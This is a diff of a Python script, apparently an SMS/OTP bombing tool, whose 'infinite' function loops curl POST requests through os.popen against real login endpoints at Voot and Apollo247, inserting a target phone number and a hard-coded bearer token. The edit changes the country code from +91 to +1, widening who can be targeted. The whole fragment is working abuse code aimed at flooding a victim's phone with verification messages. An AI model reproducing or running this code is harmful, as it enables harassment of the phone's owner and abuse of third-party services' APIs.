@@ -23,7 +23,7 @@ def infinite(target, color, msgs):
             '''
                         curl -X POST -H "Host:us-central1-vootdev.cloudfunctions.net" -H "content-length:59" -H "accept:application/json, text/plain, */*" -H "user-agent:Mozilla/5.0 (Linux; Android 8.1.0; CPH1909) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.101 Mobile Safari/537.36" -H "content-type:application/json;charset=UTF-8" -H "origin:https://www.voot.com" -H "sec-fetch-site:cross-site" -H "sec-fetch-mode:cors" -H "sec-fetch-dest:empty" -H "referer:https://www.voot.com/" -H "accept-encoding:gzip, deflate, br" -H "accept-language:en-US,en;q=0.9,hi;q=0.8" -d '{"type":"mobile","mobile":"'''
             + target +
-            '''","countryCode":"+91"}' "https://us-central1-vootdev.cloudfunctions.net/usersV3/v3/checkUser" > /dev/null 2>&1
+            '''","countryCode":"+1"}' "https://us-central1-vootdev.cloudfunctions.net/usersV3/v3/checkUser" > /dev/null 2>&1
                         ''')
         times = times + 1
         os.popen(
@@ -43,7 +43,7 @@ def infinite(target, color, msgs):
 
         os.popen(
             '''
-                        curl -X POST -H "Host:webapi.apollo247.com" -H "Connection:keep-alive" -H "Content-Length:292" -H "accept:*/*" -H "Authorization:Bearer 3d1833da7020e0602165529446587434" -H "Save-Data:on" -H "User-Agent:Mozilla/5.0 (Linux; Android 8.1.0; CPH1909) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.101 Mobile Safari/537.36" -H "content-type:application/json" -H "Origin:https://www.apollo247.com" -H "Sec-Fetch-Site:same-site" -H "Sec-Fetch-Mode:cors" -H "Sec-Fetch-Dest:empty" -H "Referer:https://www.apollo247.com/medicines?gclid=CjwKCAjwh7H7BRBBEiwAPXjadvKY3NSyNG-0yNkxp2qz2Jd5T0_zltNV3OnwoDFh3ECOsNImtyi1KxoCQY0QAvD_BwE" -H "Accept-Encoding:gzip, deflate, br" -H "Accept-Language:en-US,en;q=0.9,hi;q=0.8" -d '{"operationName":"Login","variables":{"mobileNumber":"+91'''
+                        curl -X POST -H "Host:webapi.apollo247.com" -H "Connection:keep-alive" -H "Content-Length:292" -H "accept:*/*" -H "Authorization:Bearer 3d1833da7020e0602165529446587434" -H "Save-Data:on" -H "User-Agent:Mozilla/5.0 (Linux; Android 8.1.0; CPH1909) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.101 Mobile Safari/537.36" -H "content-type:application/json" -H "Origin:https://www.apollo247.com" -H "Sec-Fetch-Site:same-site" -H "Sec-Fetch-Mode:cors" -H "Sec-Fetch-Dest:empty" -H "Referer:https://www.apollo247.com/medicines?gclid=CjwKCAjwh7H7BRBBEiwAPXjadvKY3NSyNG-0yNkxp2qz2Jd5T0_zltNV3OnwoDFh3ECOsNImtyi1KxoCQY0QAvD_BwE" -H "Accept-Encoding:gzip, deflate, br" -H "Accept-Language:en-US,en;q=0.9,hi;q=0.8" -d '{"operationName":"Login","variables":{"mobileNumber":"+1'''
             + target +
             '''","loginType":"PATIENT"},"query":"query Login($mobileNumber: String!, $loginType: LOGIN_TYPE!) {\n  login(mobileNumber: $mobileNumber, loginType: $loginType) {\nstatus\nmessage\nloginId\n__typename\n  }\n}\n"}' "https://webapi.apollo247.com/" > /dev/null 2>&1
                         ''')
